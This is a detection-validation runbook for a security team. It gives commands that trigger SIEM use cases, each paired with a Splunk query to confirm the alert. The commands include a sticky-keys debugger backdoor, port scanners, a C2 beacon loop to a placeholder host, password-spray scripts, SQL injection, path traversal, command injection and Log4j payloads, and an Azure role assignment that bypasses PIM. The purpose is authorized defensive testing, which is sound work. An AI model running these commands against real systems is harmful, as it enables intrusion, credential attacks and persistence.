# TDA Use-Case Trigger Runbook (Part 2)

Authorized detection-validation runbook. Each use case = the safe action to
generate the activity the detection watches for, plus where to run it and how to
validate. Uses safe test artifacts only (EICAR, benign files, Atomic Red Team,
test PII patterns).

> **Rules of engagement:** written authorization required. Cloud, mail, DLP and
> firewall use cases need access/credentials beyond the endpoint — confirm scope
> before running. Note UTC time + host/source for every test.

## Feasibility from ONE Windows machine

| Can do from the Windows box | Needs extra access |
|---|---|
| Host/EDR: UC0032, UC0149, UC0125, UC0185, SPLUC0187, UC0043 | Mail: UC0222, SPLUC0107 (a mailbox to send into) |
| Network: UC0053, UC0054, UC0141, UC0046 | DLP: UC0575 (a DLP-monitored channel) |
| Web: UC0228, UC0229 | Cloud: UC0458, UC0215, UC0327, M365 spray, MFA takeover, VM abuse (Azure/M365 creds) |
| | Firewall: UC0110 (firewall admin) |

Legend: run in **PowerShell as Administrator** unless noted. Replace `<HOSTNAME>`,
`<TARGET>`, `<WEBAPP>` with real values.

---

# GROUP A — Host / EDR (run on the Windows box)

## UC0032 — Critical Malware Detected on EDR
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
Get-Content "$env:TEMP\eicar.com"
```
**Validate:** EDR alert `EICAR-Test-File`.
```spl
index=* host="<HOSTNAME>" ("EICAR" OR "Test-File") earliest=-15m
| table _time host threat_name action file_path
```

## UC0149 — Multiple AV Infections on Same Host
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
```
**Validate:** `| stats dc(file_path) as infections by host | where infections>=2`

## UC0125 — Common Ransomware Extensions Detected
Create many files renamed to known ransomware extensions + a ransom note.
```powershell
$dir = "$env:TEMP\ransomtest"; New-Item -ItemType Directory -Force $dir | Out-Null
$ext = ".locky",".crypt",".encrypted",".wncry",".cerber",".zepto",".crypto",".enc"
1..20 | ForEach-Object {
  $f = "$dir\doc$_.txt"; "test data" | Set-Content $f
  Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])"
}
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
**Validate:**
```spl
index=* host="<HOSTNAME>" (".locky" OR ".wncry" OR ".encrypted" OR "READ_ME_DECRYPT") earliest=-15m
| table _time host New_Process_Name Process_Command_Line
```
**Cleanup:** `Remove-Item $env:TEMP\ransomtest -Recurse -Force`

## UC0185 — Abuse of Accessibility Binaries (Sticky Keys / Shift x5)
Sets a debugger on `sethc.exe` (sticky keys) — the reversible registry method.
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```
**Validate:** Registry-modify event on the IFEO key for `sethc.exe`/`utilman.exe`.
```spl
index=* host="<HOSTNAME>" ("Image File Execution Options" AND ("sethc.exe" OR "utilman.exe")) earliest=-15m
| table _time host EventCode Object_Name Process_Command_Line
```
**Cleanup:**
```powershell
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
```
(Atomic equivalent: `Invoke-AtomicTest T1546.008`.)

## SPLUC0187 — Scheduled Task Calling Malicious Child Process
```powershell
schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > %TEMP%\uc0187.txt" /sc once /st 23:59 /f
schtasks /run /tn "uc0187test"
schtasks /delete /tn "uc0187test" /f
```
**Validate:** task creation (4698) + `svchost.exe`→`cmd.exe`.
```spl
index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*cmd.exe" Creator_Process_Name="*svchost.exe" earliest=-15m
| table _time Creator_Process_Name New_Process_Name Process_Command_Line
```

## UC0043 — Threat Activity Detected (generic)
Run a burst of recon/attacker behavior (or any Atomic test).
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
**Validate:** several discovery processes from one host in a short window.

---

# GROUP B — Network (run from the Windows box)

## UC0053 — Horizontal Port Scan (one port, many hosts)
```powershell
$port=445
"172.16.75","172.16.5" | ForEach-Object { $s=$_; 1..254 | ForEach-Object {
  $ip="$s.$_"; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$port,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$port OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() } }
```
**Validate:** `| stats dc(dest_ip) as hosts by src | where hosts>=51`

## UC0054 — Vertical Port Scan (many ports, one host)
```powershell
$ip="<TARGET>"
1..1024 | ForEach-Object { $p=$_; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$p,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$p OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() }
```
**Validate:** `| stats dc(dest_port) as ports by dest | where ports>=100`

## UC0141 — C2 / Command-and-Control Traffic
Simulate beaconing: regular small outbound requests to a rare external host at a
fixed interval (the pattern C2 detections flag). Use a lab-controlled endpoint.
```powershell
$c2="http://<LAB_C2_HOST>/beacon"
1..30 | ForEach-Object {
  try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="Mozilla/5.0 (compatible; beacon)" } | Out-Null } catch {}
  Start-Sleep -Seconds 10
}
```
(Alternatives: Atomic `T1071.001`, or point a benign agent at a lab C2 test server. Do NOT contact real malicious infrastructure.)
**Validate:** repeated periodic connections, same src→dest, regular interval, in proxy/firewall logs.

## UC0046 — Password Spray Detected
One password against many accounts (needs a domain user list + authorization).
```powershell
$users = Get-Content .\users.txt      # or net user /domain
$pw = "Winter2026!"
foreach ($u in $users) {
  Start-Process cmd -ArgumentList "/c net use \\<DC>\IPC$ /user:$u $pw" -WindowStyle Hidden
  Start-Sleep -Milliseconds 300
}
```
**Validate:** many `EventCode=4625` (failed logon) across distinct accounts, one source.
```spl
index=* EventCode=4625 earliest=-15m | stats dc(user) as accounts by src | where accounts>=10
```
> Use a small password list and agreed accounts to avoid lockouts. Tool alt: `DomainPasswordSpray.ps1`.

---

# GROUP C — Web (from the Windows box against the web app)

## UC0228 — SQL Injection Attempt (pattern match)
```powershell
$u="http://<WEBAPP>"
"1' OR '1'='1","1; DROP TABLE users--","' UNION SELECT null,username,password FROM users--" | ForEach-Object {
  $p=[uri]::EscapeDataString($_)
  try { Invoke-WebRequest "$u/product?id=$p" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {}
}
```
(Or from Kali: `sqlmap -u "http://<WEBAPP>/product?id=1" --batch`.)
**Validate:** WAF/web logs with SQLi patterns from your source IP.

## UC0229 — Web Application Exploit Detected
Send common exploit payloads (XSS, traversal, command injection, Log4j probe).
```powershell
$u="http://<WEBAPP>"
$payloads = @(
 "/search?q=<script>alert(1)</script>",
 "/download?file=../../../../etc/passwd",
 "/ping?host=127.0.0.1;whoami",
 '/api?x=${jndi:ldap://127.0.0.1/a}'
)
$payloads | ForEach-Object { try { Invoke-WebRequest "$u$_" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
**Validate:** WAF/IPS/web logs flag the exploit patterns from your source IP.
> This repo's `OWASP_TOP10_TEST_COMMANDS.md` has more ready web payloads.

---

# GROUP D — Email / DLP (needs a mail channel / DLP-monitored path)

## UC0222 — Suspicious Email Attachment / Malware by Mail
Send an email into the org with (a) an EICAR attachment and (b) a suspicious
extension (`.exe`/`.scr`/`.js`/`.hta`). **Requires a sending mailbox.**
- Attach `eicar.com` (from UC0032) → tests mail AV.
- Attach a file named e.g. `invoice.exe` → tests attachment-extension rule.

**Validate:** mail security/SIEM logs show the blocked/flagged attachment + malware verdict.

## SPLUC0107 — Suspected Phishing Email
Send a phishing-style test email into a monitored mailbox: spoofed/lookalike
sender, urgent language, a suspicious link (lab-controlled URL). **Requires a
sending mailbox** (use an authorized phishing-sim sender or your test account).
**Validate:** mail security / phishing detection logs flag the message.

## UC0575 — Multiple DLP Violations for a User
Trigger the DLP engine several times with test-sensitive data (fake, non-real):
```powershell
$dir="$env:TEMP\dlptest"; New-Item -ItemType Directory -Force $dir | Out-Null
1..5 | ForEach-Object {
  @"
Credit Card: 4111 1111 1111 1111
SSN: 123-45-6789
IBAN: GB82 WEST 1234 5698 7654 32
"@ | Set-Content "$dir\sensitive_$_.txt"
}
```
Then move them through a DLP-monitored channel (email out, upload, USB copy) to
generate **multiple** violations for the same user.
**Validate:** DLP console / SIEM shows ≥2 violations for the user.
> Use only fake test patterns. Confirm DLP testing is in scope.

---

# GROUP E — Cloud: Azure / M365 (needs cloud credentials)

> These cannot be triggered from the Windows endpoint alone — they need Azure/
> M365 accounts and the Az CLI / Microsoft Graph / portal. Install: `winget install Microsoft.AzureCLI`.

## UC0458 — Azure Activity CRUD Operation Detected
Perform create/update/delete on an Azure resource (generates Activity Log events).
```powershell
az login
az group create -n tda-test-rg -l eastus                 # CREATE
az tag create --resource-id <id> --tags test=tda           # UPDATE
az group delete -n tda-test-rg --yes                       # DELETE
```
**Validate:** Azure Activity Log / Sentinel shows the CRUD operations.

## UC0215 — Explicit MFA Deny
Sign in with a test M365 account and, at the MFA prompt, **choose Deny / "No, it's not me"** (or reject the Authenticator push).
**Validate:** Entra ID sign-in logs show MFA denied / failed with reason.

## UC0327 — Azure AD Privileged Access Outside PIM
Use a role that's assigned **permanently** (not activated through PIM) to perform an admin action, or assign a privileged role directly (bypassing PIM).
```powershell
az role assignment create --assignee <user> --role "User Access Administrator" --scope /subscriptions/<sub>
```
**Validate:** Entra audit logs show privileged action without a matching PIM activation.

## Password Spraying M365
Spray common passwords across M365 accounts (authorized). Tools: `MSOLSpray`, `TREVORspray`.
```powershell
# MSOLSpray example
Invoke-MSOLSpray -UserList .\users.txt -Password "Autumn2026!"
```
**Validate:** Entra sign-in logs — many failed logons across accounts from one source.

## Malicious MFA Takeover
Simulate MFA fatigue / registration abuse on a test account: repeatedly trigger
push prompts, or register a new MFA method on the account.
**Validate:** Entra logs show repeated MFA requests / a new security-info registration.

## Abusing Virtual Machines
Use Azure VM "Run Command" to execute on a VM (agentless code exec via the control plane).
```powershell
az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript --scripts "whoami"
```
**Validate:** Activity log shows `runCommand` action on the VM.

---

# GROUP F — Firewall

## UC0110 — Privilege Change on Firewall
**Requires firewall admin access** (not doable from the endpoint). On the firewall,
create/modify an admin account or change an admin's role/privilege.
**Validate:** firewall admin/audit logs (forwarded to SIEM) show the privilege change.

---

## Per-test checklist
1. Note **UTC time + source host/IP**.  2. Announce to SOC.  3. Run.
4. Pull events with the SPL (adjust index/fields to the environment).
5. Record pass (detected) / gap (no alert).  6. Clean up artifacts.

*Replace all `<PLACEHOLDERS>`. Field names (`threat_name`, `dest_port`, etc.) vary by data source — adjust to the environment.*
